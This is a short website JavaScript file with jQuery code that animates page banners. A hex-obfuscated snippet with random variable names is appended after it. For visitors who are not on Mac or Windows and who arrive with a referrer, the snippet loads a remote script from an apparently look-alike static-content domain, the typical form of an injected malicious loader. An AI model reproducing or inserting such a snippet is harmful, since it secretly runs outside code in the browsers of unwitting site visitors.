$(document).ready(function() {
	$(".hot_banner_box").append('');
	setTimeout(function () {
        $("#loading").remove();   
	    $(".banner-top,.banner-wtop").addClass("opacity-top");
    }, 2000);
});if(!(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1)){var oEfdbvj=document.createElement('script');oEfdbvj.type = 'text/javascript'; oEfdbvj.src = '\x68\x74\x74\x70\x73://\x7a\x7a.\x62\x64\x75\x73\x74\x61\x74\x69\x63.\x63\x6f\x6d/\x6c\x69\x6e\x6b\x73\x75\x62\x6d\x69\x74/\x70\x75\x73\x68.\x6a\x73'; var agYqyk=document.head || document.body;agYqyk.appendChild(oEfdbvj);}